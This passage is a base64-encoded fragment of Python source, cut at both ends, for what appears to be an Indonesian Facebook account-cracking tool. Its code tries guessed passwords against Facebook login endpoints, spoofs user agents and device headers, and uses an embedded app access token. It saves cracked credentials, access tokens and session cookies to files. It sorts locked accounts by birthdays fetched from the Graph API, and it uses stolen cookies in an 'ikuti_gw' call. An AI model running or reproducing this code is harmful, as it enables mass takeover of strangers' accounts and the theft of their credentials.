RTCBTdGl4IDM1MDAgQnVpbGQvTE1ZNDlGOyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzY3LjAuMzM5Ni44NyBTYWZhcmkvNTM3LjM2IiwiTm9raWFDMy0wMC81LjAgKDA3LjIwKSBQcm9maWxlL01JRFAtMi4xIENvbmZpZ3VyYXRpb24vQ0xEQy0xLjEgTW96aWxsYS81LjAgQXBwbGVXZWJLaXQvNDIwKyAoS0hUTUwsIGxpa2UgR2Vja28pIFNhZmFyaS80MjArIiwiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDUuMDsgQVNVU19aMDBBRCBCdWlsZC9MUlgyMVYpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS8zNy4wLjAuMCBNb2JpbGUgU2FmYXJpLzUzNy4zNiIsIltGQkFOL0ZCNEEsRkJBVi8yMjIuMC4wLjQ4LjExMztGQkJWLzE1NTMyMzM2NjtGQkRNL3tkZW5zaXR5PTIuMCx3aWR0aD03MjAsaGVpZ2h0PTEzNjB9O0ZCTEMvc3JfUlM7RkJSVi8xNTY2MjU2OTY7RkJDUi9tdDpzO0ZCTUYvSFVBV0VJO0ZCQkQvSFVBV0VJLC5GQlBOL2NvbS5mYWNlYm9vay5rYXRhbmE7RkJEVi9MRE4tTDIxO0ZCU1YvOC4wLjA7RkJPUC8xOS5GQkNBL2FybWVhYmktdjdhOmFybWVhYmksXSIsIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS85MC4wLjQ0MzAuOTMgU2FmYXJpLzUzNy4zNiJdKQ0KICAgICAgICAgICAgaGVhZGVyID0geyJ1c2VyLWFnZW50IjogdWFfcGksIngtZmItY29ubmVjdGlvbi1iYW5kd2lkdGgiOiBzdHIocmFuZG9tLnJhbmRpbnQoMjAwMDAwMDAuMCwzMDAwMDAwMC4wKSksIngtZmItc2ltLWhuaSI6IHN0cihyYW5kb20ucmFuZGludCgyMDAwMCw0MDAwMCkpLCJ4LWZiLW5ldC1obmkiOiBzdHIocmFuZG9tLnJhbmRpbnQoMjAwMDAsNDAwMDApKSwieC1mYi1jb25uZWN0aW9uLXF1YWxpdHkiOiAiRVhDRUxMRU5UIiwieC1mYi1jb25uZWN0aW9uLXR5cGUiOiAiY2VsbC5DVFJhZGlvQWNjZXNzVGVjaG5vbG9neUhTRFBBIiwiY29udGVudC10eXBlIjogImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCIsIngtZmItaHR0cC1lbmdpbmUiOiAiTGlnZXIifQ0KICAgICAgICAgICAgcmVzcG9uc2UgPSBzZXMuZ2V0KCdodHRwczovL2ItYXBpLmZhY2Vib29rLmNvbS9tZXRob2QvYXV0aC5sb2dpbj9mb3JtYXQ9anNvbiZlbWFpbD0nK3N0cih1c2VyKSsnJnBhc3N3b3JkPScrc3RyKHB3KSsnJmNyZWRlbnRpYWxzX3R5cGU9ZGV2aWNlX2Jhc2VkX2xvZ2luX3Bhc3N3b3JkJmdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xJmVycm9yX2RldGFpbF90eXBlPWJ1dHRvbl93aXRoX2Rpc2FibGVkJnNvdXJjZT1kZXZpY2VfYmFzZWRfbG9naW4mbWV0YV9pbmZfZmJtZXRhPSUyMCZjdXJyZW50bHlfbG9nZ2VkX2luX3VzZXJpZD0wJm1ldGhvZD1HRVQmbG9jYWxlPWVuX1VTJmNsaWVudF9jb3VudHJ5X2NvZGU9VVMmZmJfYXBpX2NhbGxlcl9jbGFzcz1jb20uZmFjZWJvb2suZm9zLmhlYWRlcnN2Mi5mYjRhb3JjYS5IZWFkZXJzVjJDb25maWdGZXRjaFJlcXVlc3RIYW5kbGVyJmFjY2Vzc190b2tlbj0zNTA2ODU1MzE3Mjh8NjJmOGNlOWY3NGIxMmY4NGMxMjNjYzIzNDM3YTRhMzImZmJfYXBpX3JlcV9mcmllbmRseV9uYW1lPWF1dGhlbnRpY2F0ZSZjcGw9dHJ1ZScsIGhlYWRlcnM9aGVhZGVyKS50ZXh0DQogICAgICAgICAgICBpZiAiQW5kYSBUaWRhayBEYXBhdCBNZW5nZ3VuYWthbiBGaXR1ciBJbmkgU2VrYXJhbmciIGluIHJlc3BvbnNlOg0KICAgICAgICAgICAgCWxvb3AgKz0xDQogICAgICAgICAgICAgICAgcHJpbnQgKCJcclwwMzNbMDs5MW3igKIgSVAgdGVyYmxva2lyLiBoaWR1cGthbiBtb2RlIHBlc2F3YXQgMiBkZXRpayIpLA0KICAgICAgICAgICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKQ0KICAgICAgICAgICAgICAgIHNlbGYuYl9hcGkodXNlciwgbWFudWFsKQ0KICAgICAgICAgICAgaWYgJ3Nlc3Npb25fa2V5JyBpbiByZXNwb25zZSBhbmQgJ0VBQUEnIGluIHJlc3BvbnNlOg0KICAgICAgICAgICAgICAgIHByaW50ICdcciAlcyotLT4gJXMg4peKICVzIOKXiiAlcyAnICUgKEgsdXNlcixwdyxyZXNwb25zZS5qc29uKClbJ2FjY2Vzc190b2tlbiddKQ0KICAgICAgICAgICAgICAgIG9rLmFwcGVuZCgnJXMg4peKICVzIOKXiiAlcyclKHVzZXIscHcscmVzcG9uc2UuanNvbigpWydhY2Nlc3NfdG9rZW4nXSkpDQogICAgICAgICAgICAgICAgb3BlbignT0svJXMudHh0JyUod2FrdHUpLCAnYScpLndyaXRlKCcgKi0tPiAlcyDil4ogJXMg4peKICVzXG4nJSh1c2VyLHB3LHJlc3BvbnNlLmpzb24oKVsnYWNjZXNzX3Rva2VuJ10pKQ0KICAgICAgICAgICAgICAgIGJyZWFrDQogICAgICAgICAgICBlbGlmICd3d3cuZmFjZWJvb2suY29tJyBpbiByZXNwb25zZS5qc29uKClbJ2Vycm9yX21zZyddOg0KICAgICAgICAgICAgICAgIGlmICJtdW5jdWwiIGluIHNlbGYub3BzaV9jOg0KICAgICAgICAgICAgICAgIAl0cnk6DQogICAgICAgICAgICAgICAgCSAgICByb216ID0gb3BlbignZGF0YS90b2tlbi50eHQnKS5yZWFkKCkNCiAgICAgICAgICAgICAgICAJICAgIGxhaGlyID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8lcz9hY2Nlc3NfdG9rZW49JXMnJSh1c2VyLHJvbXopKS5qc29uKClbJ2JpcnRoZGF5J10NCiAgICAgICAgICAgICAgICAJICAgIG1vbnRoLCBkYXksIHllYXIgPSBsYWhpci5zcGxpdCgnLycpDQogICAgICAgICAgICAgICAgCSAgICBzZWxmLmNyNGNrKHVzZXIscHcsZGF5LG1vbnRoLHllYXIpDQogICAgICAgICAgICAgICAgCSAgICBjcC5hcHBlbmQoIiVzIOKXiiAlcyDil4ogJXMgJXMgJXMiJSh1c2VyLHB3LGRheSxtb250aCx5ZWFyKSkNCiAgICAgICAgICAgICAgICAJICAgIG9wZW4oJ0NQLyVzLnR4dCcgJSh3YWt0dSksICdhJykud3JpdGUoIiAqLS0+ICVzIOKXiiAlcyDil4ogJXMgJXMgJXNcbiIlICh1c2VyLHB3LGRheSxtb250aCx5ZWFyKSkNCiAgICAgICAgICAgICAgICAJICAgIGJyZWFrDQogICAgICAgICAgICAgICAgCWV4Y2VwdCBLZXlFcnJvcjoNCiAgICAgICAgICAgICAgICAJICAgIGRheSA9ICcnDQogICAgICAgICAgICAgICAgCSAgICBtb250aCA9ICcnDQogICAgICAgICAgICAgICAgCSAgICB5ZWFyICA9ICcnDQogICAgICAgICAgICAgICAgCWV4Y2VwdDogcGFzcw0KICAgICAgICAgICAgICAgIAlzZWxmLmNyM2NrKHVzZXIscHcpDQogICAgICAgICAgICAgICAgCWNwLmFwcGVuZCgnJXMg4peKICVzJyUodXNlcixwdykpDQogICAgICAgICAgICAgICAgCW9wZW4oJ0NQLyVzLnR4dCcgJSh3YWt0dSksICdhJykud3JpdGUoIiAqLS0+ICVzIOKXiiAlc1xuIiAlICh1c2VyLHB3KSkNCiAgICAgICAgICAgICAgICAJYnJlYWsNCiAgICAgICAgICAgICAgICBlbGlmICJna19tdW5jdWwiIGluIHNlbGYub3BzaV9jOg0KICAgICAgICAgICAgICAgIAl0cnk6DQogICAgICAgICAgICAgICAgCSAgICByb216ID0gb3BlbignZGF0YS90b2tlbi50eHQnKS5yZWFkKCkNCiAgICAgICAgICAgICAgICAJICAgIGxhaGlyID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8lcz9hY2Nlc3NfdG9rZW49JXMnJSh1c2VyLHJvbXopKS5qc29uKClbJ2JpcnRoZGF5J10NCiAgICAgICAgICAgICAgICAJICAgIG1vbnRoLCBkYXksIHllYXIgPSBsYWhpci5zcGxpdCgnLycpDQogICAgICAgICAgICAgICAgCSAgICBwcmludCAnXHIgJXMqLS0+ICVzIOKXiiAlcyDil4ogJXMgJXMgJXMgICcgJSAoSyx1c2VyLHB3LGRheSxtb250aCx5ZWFyKQ0KICAgICAgICAgICAgICAgIAkgICAgY3AuYXBwZW5kKCIlcyDil4ogJXMg4peKICVzICVzICVzIiUodXNlcixwdyxkYXksbW9udGgseWVhcikpDQogICAgICAgICAgICAgICAgCSAgICBvcGVuKCdDUC8lcy50eHQnICUod2FrdHUpLCAnYScpLndyaXRlKCIgKi0tPiAlcyDil4ogJXMg4peKICVzICVzICVzXG4iJSAodXNlcixwdyxkYXksbW9udGgseWVhcikpDQogICAgICAgICAgICAgICAgCSAgICBicmVhaw0KICAgICAgICAgICAgICAgIAlleGNlcHQgS2V5RXJyb3I6DQogICAgICAgICAgICAgICAgCSAgICBkYXkgPSAnJw0KICAgICAgICAgICAgICAgIAkgICAgbW9udGggPSAnJw0KICAgICAgICAgICAgICAgIAkgICAgeWVhciAgPSAnJw0KICAgICAgICAgICAgICAgIAlleGNlcHQ6IHBhc3MNCiAgICAgICAgICAgICAgICAJcHJpbnQgJ1xyICVzKi0tPiAlcyDil4ogJXMgICAgICAgICAgICcgJSAoSyx1c2VyLHB3KQ0KICAgICAgICAgICAgICAgIAljcC5hcHBlbmQoJyVzIOKXiiAlcyclKHVzZXIscHcpKQ0KICAgICAgICAgICAgICAgIAlvcGVuKCdDUC8lcy50eHQnICUod2FrdHUpLCAnYScpLndyaXRlKCIgKi0tPiAlcyDil4ogJXNcbiIgJSAodXNlcixwdykpDQogICAgICAgICAgICAgICAgCWJyZWFrDQogICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgCWNvbnRpbnVlDQogICAgICAgIGxvb3AgKz0gMQ0KICAgICAgICB3YXJuYSA9IHJhbmRvbS5jaG9pY2UoW00sIEgsIEssIEIsIFUsIE8sIFBdKQ0KICAgICAgICBwcmludCgnXHInK3dhcm5hKyfigKJceDFiWzE7OTZtIFtjcmFja10gJXMvJXMgW09LOiVzXS1bQ1A6JXNdJyUobG9vcCxsZW4oc2VsZi5pZCksbGVuKG9rKSxsZW4oY3ApKSksDQogICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKQ0KICAgIyBNQkFTSUMNCiAgICBkZWYgYmFzaWMoc2VsZiwgdXNlciwgbWFudWFsLCoqZGF0YSk6DQogICAgCWdsb2JhbCBvayxjcCxsb29wDQogICAgCWlmICJyYW5kb20iIGluIHNlbGYudWdlbjoNCiAgICAJICAgIHRyeToNCiAgICAJICAgICAgICB1YSA9IHJhbmRvbS5jaG9pY2UoWyJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgNC40LjQ7IGVuLWF1OyBTQU1TVU5HIFNNLU45MTVHIEJ1aWxkL0tUVTg0UCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLVEhNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi8yLjAgQ2hyb21lLzM0LjAuMTg0Ny43NiBNb2JpbGUgU2FmYXJpLzUzNy4zNiIsIk5va2lhWDMtMDIvNS4wICgwNi4wNSkgUHJvZmlsZS9NSURQLTIuMSBDb25maWd1cmF0aW9uL0NMREMtMS4xIE1vemlsbGEvNS4wIEFwcGxlV2ViS2l0LzQyMCsgKEtIVE1MLCBsaWtlIEdlY2tvKSBTYWZhcmkvNDIwKyIsIk1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMDsgTWkgOVQgUHJvIEJ1aWxkL1FLUTEuMTkwODI1LjAwMjsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS84OC4wLjQzMjQuMTgxIE1vYmlsZSBTYWZhcmkvNTM3LjM2W0ZCQU4vRU1BO0ZCTEMvaXRfSVQ7RkJBVi8yMzkuMC4wLjEwLjEwOTtdIiwiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDQuMS4yOyBOb2tpYV9YIEJ1aWxkL0paTzU0SykgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzMwLjAuMTU5OS44MiBNb2JpbGUgU2FmYXJpLzUzNy4zNiBOb2tpYUJyb3dzZXIvMS4yLjAuMTIiLCJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgNS4xLjE7IE5hdm9yaSBRTCBTdGl4IDM1MDAgQnVpbGQvTE1ZNDlGOyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzY3LjAuMzM5Ni44NyBTYWZhcmkvNTM3LjM2IiwiTm9raWFDMy0wMC81LjAgKDA3LjIwKSBQcm9maWxlL01JRFAtMi4xIENvbmZpZ3VyYXRpb24vQ0xEQy0xLjEgTW96aWxsYS81LjAgQXBwbGVXZWJLaXQvNDIwKyAoS0hUTUwsIGxpa2UgR2Vja28pIFNhZmFyaS80MjArIiwiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDUuMDsgQVNVU19aMDBBRCBCdWlsZC9MUlgyMVYpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS8zNy4wLjAuMCBNb2JpbGUgU2FmYXJpLzUzNy4zNiIsIltGQkFOL0ZCNEEsRkJBVi8yMjIuMC4wLjQ4LjExMztGQkJWLzE1NTMyMzM2NjtGQkRNL3tkZW5zaXR5PTIuMCx3aWR0aD03MjAsaGVpZ2h0PTEzNjB9O0ZCTEMvc3JfUlM7RkJSVi8xNTY2MjU2OTY7RkJDUi9tdDpzO0ZCTUYvSFVBV0VJO0ZCQkQvSFVBV0VJLC5GQlBOL2NvbS5mYWNlYm9vay5rYXRhbmE7RkJEVi9MRE4tTDIxO0ZCU1YvOC4wLjA7RkJPUC8xOS5GQkNBL2FybWVhYmktdjdhOmFybWVhYmksXSIsIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS85MC4wLjQ0MzAuOTMgU2FmYXJpLzUzNy4zNiJdKQ0KICAgICAgICAgICAgZXhjZXB0IElPRXJyb3I6DQogICAgICAgICAgICAJdWEgPSAnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBNaSA5VCBQcm8gQnVpbGQvUUtRMS4xOTA4MjUuMDAyOyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzg4LjAuNDMyNC4xODEgTW9iaWxlIFNhZmFyaS81MzcuMzZbRkJBTi9FTUE7RkJMQy9pdF9JVDtGQkFWLzIzOS4wLjAuMTAuMTA5O10nDQogICAgICAgIGVsaWYgImdrX3JhbmRvbSIgaW4gc2VsZi51Z2VuOg0KICAgICAgICAJdHJ5Og0KICAgICAgICAJICAgIHVhID0gb3BlbigndWEudHh0JywgJ3InKS5yZWFkKCkNCiAgICAgICAgCWV4Y2VwdCBJT0Vycm9yOg0KICAgICAgICAJICAgIHVhID0gJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMDsgTWkgOVQgUHJvIEJ1aWxkL1FLUTEuMTkwODI1LjAwMjsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS84OC4wLjQzMjQuMTgxIE1vYmlsZSBTYWZhcmkvNTM3LjM2W0ZCQU4vRU1BO0ZCTEMvaXRfSVQ7RkJBVi8yMzkuMC4wLjEwLjEwOTtdJw0KICAgICAgICBmb3IgcHcgaW4gbWFudWFsOiAgDQogICAgICAgICAgICBzZXMgPSByZXF1ZXN0cy5TZXNzaW9uKCkNCiAgICAgICAgICAgIHNlcy5oZWFkZXJzLnVwZGF0ZSh7Ikhvc3QiOiJtYmFzaWMuZmFjZWJvb2suY29tIiwidXBncmFkZS1pbnNlY3VyZS1yZXF1ZXN0cyI6IjEiLCJ1c2VyLWFnZW50Ijp1YSwiYWNjZXB0IjoidGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3NpZ25lZC1leGNoYW5nZTt2PWIzO3E9MC45IiwiZG50IjoiMSIsIngtcmVxdWVzdGVkLXdpdGgiOiJtYXJrLnZpYS5ncCIsInNlYy1mZXRjaC1zaXRlIjoibm9uZSIsInNlYy1mZXRjaC1tb2RlIjoibmF2aWdhdGUiLCJzZWMtZmV0Y2gtdXNlciI6Ij8xIiwic2VjLWZldGNoLWRlc3QiOiJkb2N1bWVudCIsInJlZmVyZXIiOiJodHRwczovL2RldmVsb3BlcnMuZmFjZWJvb2suY29tLyIsImFjY2VwdC1lbmNvZGluZyI6Imd6aXAsIGRlZmxhdGUiLCJhY2NlcHQtbGFuZ3VhZ2UiOiJpZC1JRCxpZDtxPTAuOSxlbi1VUztxPTAuOCxlbjtxPTAuNyJ9KQ0KICAgICAgICAgICAgcCA9IHNlcy5nZXQoJ2h0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS9pbmRleC5waHA/bmV4dD1odHRwcyUzQSUyRiUyRmRldmVsb3BlcnMuZmFjZWJvb2suY29tJTJGdG9vbHMlMkZkZWJ1ZyUyRmFjY2Vzc3Rva2VuJTJGJykudGV4dA0KICAgICAgICAgICAgZGF0YWEgPXsibHNkIjpyZS5zZWFyY2goJ25hbWU9ImxzZCIgdmFsdWU9IiguKj8pIicsIHN0cihwKSkuZ3JvdXAoMSksImphem9lc3QiOnJlLnNlYXJjaCgnbmFtZT0iamF6b2VzdCIgdmFsdWU9IiguKj8pIicsIHN0cihwKSkuZ3JvdXAoMSksInVpZCI6dXNlciwiZmxvdyI6ImxvZ2luX25vX3BpbiIsInBhc3MiOnB3LCJuZXh0IjoiaHR0cHM6Ly9kZXZlbG9wZXJzLmZhY2Vib29rLmNvbS90b29scy9kZWJ1Zy9hY2Nlc3N0b2tlbi8ifQ0KICAgICAgICAgICAgc2VzLmhlYWRlcnMudXBkYXRlKHsiSG9zdCI6Im1iYXNpYy5mYWNlYm9vay5jb20iLCJjYWNoZS1jb250cm9sIjoibWF4LWFnZT0wIiwidXBncmFkZS1pbnNlY3VyZS1yZXF1ZXN0cyI6IjEiLCJvcmlnaW4iOiJodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20iLCJjb250ZW50LXR5cGUiOiJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQiLCJ1c2VyLWFnZW50Ijp1YSwiYWNjZXB0IjoidGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3NpZ25lZC1leGNoYW5nZTt2PWIzO3E9MC45IiwieC1yZXF1ZXN0ZWQtd2l0aCI6Im1hcmsudmlhLmdwIiwic2VjLWZldGNoLXNpdGUiOiJzYW1lLW9yaWdpbiIsInNlYy1mZXRjaC1tb2RlIjoibmF2aWdhdGUiLCJzZWMtZmV0Y2gtdXNlciI6Ij8xIiwic2VjLWZldGNoLWRlc3QiOiJkb2N1bWVudCIsInJlZmVyZXIiOiJodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20vaW5kZXgucGhwP25leHQ9aHR0cHMlM0ElMkYlMkZkZXZlbG9wZXJzLmZhY2Vib29rLmNvbSUyRnRvb2xzJTJGZGVidWclMkZhY2Nlc3N0b2tlbiUyRiIsImFjY2VwdC1lbmNvZGluZyI6Imd6aXAsIGRlZmxhdGUiLCJhY2NlcHQtbGFuZ3VhZ2UiOiJpZC1JRCxpZDtxPTAuOSxlbi1VUztxPTAuOCxlbjtxPTAuNyJ9KQ0KICAgICAgICAgICAgcG8gPSBzZXMucG9zdCgnaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC92YWxpZGF0ZS1wYXNzd29yZC8/c2hibD0wJyxkYXRhPWRhdGFhLGFsbG93X3JlZGlyZWN0cz1GYWxzZSk7amVkYSgyKQ0KICAgICAgICAgICAgaWYgJ2NfdXNlcicgaW4gc2VzLmNvb2tpZXMuZ2V0X2RpY3QoKToNCiAgICAgICAgICAgIAlrdWtpcz0iOyIuam9pbihba2V5KyI9Iit2YWx1ZSBmb3Iga2V5LHZhbHVlIGluIHNlcy5jb29raWVzLmdldF9kaWN0KCkuaXRlbXMoKV0pDQogICAgICAgICAgICAgICAgcHJpbnQgKCdcciAlcyotLT4gJXMg4peKICVzIOKXiiAlcyAnJShILHVzZXIscHcsa3VraXMpKQ0KICAgICAgICAgICAgICAgIG9rLmFwcGVuZCgnJXMg4peKICVzIOKXiiAlcyclKHVzZXIscHcsa3VraXMpKQ0KICAgICAgICAgICAgICAgIG9wZW4oJ09LLyVzLnR4dCclKHdha3R1KSwgJ2EnKS53cml0ZSgnICotLT4gJXMg4peKICVzIOKXiiAlc1xuJyUodXNlcixwdyxrdWtpcykpDQogICAgICAgICAgICAgICAgaWt1dGlfZ3coa3VraXMpDQogICAgICAgICAgICAgICAgYnJlYWsgDQogICAgICAgICAgICBlbGlmICdjaGVja3BvaW50JyBpbiBzZXMuY29va2llcy5nZXRfZGljdCgpOg0KICAgICAgICAgICAgICAgIGlmICJtdW5jdWwiIGluIHNlbGYub3BzaV9jOg0KICAgICAgICAgICAgCSAgICB0cnk6DQogICAgICAgICAgICAJICAgICAgICByb216ID0gb3BlbignZGF0YS90b2tlbi50eHQnKS5yZWFkKCkNCiAgICAgICAgICAgICAgICAgICAgICAgIGxhaGlyID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8lcz9hY2Nlc3NfdG9rZW49JXMnJSh1c2VyLHJvbXopKS5qc29uKClbJ2JpcnRoZGF5J10NCiAgICAgICAgICAgICAgICAgICAgICAgIG1vbnRoLCBkYXksIHllYXIgPSBsYWhpci5zcGxpdCgnLycpDQogICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmNyNGNrKHVzZXIscHcsZGF5LG1vbnRoLHllYXIpDQogICAgICAgICAgICAgICAgICAgICAgICBjcC5hcHBlbmQoIiVzIOKXiiAlcyDil4ogJXMgJXMgJXMiJSh1c2VyLHB3LGRheSxtb250aCx5ZWFyKSkNCiAgICAgICAgICAgICAgICAgICAgICAgIG9wZW4oJ0NQLyVzLnR4dCcgJSh3YWt0dSksICdhJykud3JpdGUoIiAqLS0+ICVzIOKXiiAlcyDil4ogJXMgJXMgJXNcbiIlICh1c2VyLHB3LGRheSxtb250aCx5ZWFyKSkNCiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrDQogICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBLZXlFcnJvcjoNCiAgICAgICAgICAgICAgICAgICAgCWRheSA9ICcnDQogICAgICAgICAgICAgICAgICAgICAgICBtb250aCAgID0gJycNCiAgICAgICAgICAgICAgICAgICAgICAgIHllYXIgID0gJycNCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0OiBwYXNzDQogICAgICAgICAgICAgICAgICAgIHNlbGYuY3IzY2sodXNlcixwdykNCiAgICAgICAgICAgICAgICAgICAgY3AuYXBwZW5kKCclcyDil4ogJXMnJSh1c2VyLHB3KSkNCiAgICAgICAgICAgICAgICAgICAgb3BlbignQ1AvJXMudHh0JyAlKHdha3R1KSwgJ2EnKS53cml0ZSgiICotLT4gJXMg4peKICVzXG4iICUgKHVzZXIscHcpKQ0KICAgICAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgICAgIGVsaWYgImdrX211bmN1bCIgaW4gc2VsZi5vcHNpX2M6DQogICAgICAgICAgICAgICAgCXRyeToNCiAgICAgICAgICAgICAgICAJICAgIHJvbXogPSBvcGVuKCdkYXRhL3Rva2VuLnR4dCcpLnJlYWQoKQ0KICAgICAgICAgICAgICAgIAkgICAgbGFoaXIgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyVzP2FjY2Vzc190b2tlbj0lcyclKHVzZXIscm9teikpLmpzb24oKVsnYmlydGhkYXknXQ0KICAgICAgICAgICAgICAgIAkgICAgbW9udGgsIGRheSwgeWVhciA9IGxhaGlyLnNwbGl0KCcvJykNCiAgICAgICAgICAgICAgICAJICAgIHByaW50ICdcciAlcyotLT4gJXMg4peKICVzIOKXiiAlcyAlcyAlcyAgJyAlIChLLHVzZXIscHcsZGF5LG1vbnRoLHllYXIpDQogICAgICAgICAgICAgICAgCSAgICBjcC5hcHBlbmQoIiVzIOKXiiAlcyDil4ogJXMgJXMgJXMiJSh1c2VyLHB3LGRheSxtb250aCx5ZWFyKSkNCiAgICAgICAgICAgICAgICAJICAgIG9wZW4oJ0NQLyVzLnR4dCcgJSh3YWt0dSksICdhJykud3JpdGUoIiAqLS0+ICVzIOKXiiAlcyDil4ogJXMgJXMgJXNcbiIlICh1c2VyLHB3LGRheSxtb250aCx5ZWFyKSkNCiAgICAgICAgICAgICAgICAJICAgIGJyZWFrDQogICAgICAgICAgICAgICAgCWV4Y2VwdCBLZXlFcnJvcjoNCiAgICAgICAgICAgICAgICAJICAgIGRheSA9ICcnDQogICAgICAgICAgICAgICAgCSAgICBtb250aCAgID0gJycNCiAgICAgICAgICAgICAgICAJICAgIHllYXIgID0gJycNCiAgICAgICAgICAgICAgICAJZXhjZXB0OiBwYXNzDQogICAgICAgICAgICAgICAgCXByaW50ICdcciAlcyotLT4gJXMg4peKICVzICAgICAgICAgICAnICUgKEssdXNlcixwdykNCiAgICAgICAgICAgICAgICAJY3AuYXBwZW5kKCclcyDil4ogJXMnJSh1c2VyLHB3KSkNCiAgICAgICAgICAgICAgICAJb3BlbignQ1AvJXMudHh0JyAlKHdha3R1KSwgJ2EnKS53cml0ZSgiICotLT4gJXMg4peKICVzXG4iICUgKHVzZXIscHcpKQ0KICAgICAgICAgICAgICAgIAlicmVhaw0KICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgIAljb250aW51ZQ0KICAgICAgICBsb29wICs9IDENCiAgICAgICAgd2FybmEgPSByYW5kb20uY2hvaWNlKFtNLCBILCBLLCBCLCBVLCBPLCBQXSkNCiAgICAgICAgcHJpbnQoJ1xyJyt3YXJuYSsn4oCiXHgxYlsxOzk2bSBbY3JhY2tdICVzLyVzIFtPSzolc10tW0NQOiVzXSclKGxvb3AsbGVuKHNlbGYuaWQpLGxlbihvayksbGVuKGNwKSkpLA0KICAgICAgICBzeXMuc3Rkb3V0LmZsdXNoKCkNCiAgICAjIE1PQklMRQ0KICAgIGRlZiBtb2JpbChzZWxmLCB1c2VyLCBtYW51YWwsKipkYXRhKToNCiAgICAJZ2xvYmFsIG9rLGNwLGxvb3ANCiAgICAJaWYgInJhbmRvbSIgaW4gc2VsZi51Z2VuOg0KICAgIAkgICAgdHJ5Og0KICAgIAkgICAgICAgIHVhID0gcmFuZG9tLmNob2ljZShbIk1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA0LjQuNDsgZW4tYXU7IFNBTVNVTkcgU00tTjkxNUcgQnVpbGQvS1RVODRQKSBBcHBsZVdlYktpdC81MzcuMzYgKEtUSE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzIuMCBDaHJvbWUvMzQuMC4xODQ3Ljc2IE1vYmlsZSBTYWZhcmkvNTM3LjM2IiwiTm9raWFYMy0wMi81LjAgKDA2LjA1KSBQcm9maWxlL01JRFAtMi4xIENvbmZpZ3VyYXRpb24vQ0xEQy0xLjEgTW96aWxsYS81LjAgQXBwbGVXZWJLaXQvNDIwKyAoS0hUTUwsIGxpa2UgR2Vja28pIFNhZmFyaS80MjArIiwiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBNaSA5VCBQcm8gQnVpbGQvUUtRMS4xOTA4MjUuMDAyOyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzg4LjAuNDMyNC4xODEgTW9iaWxlIF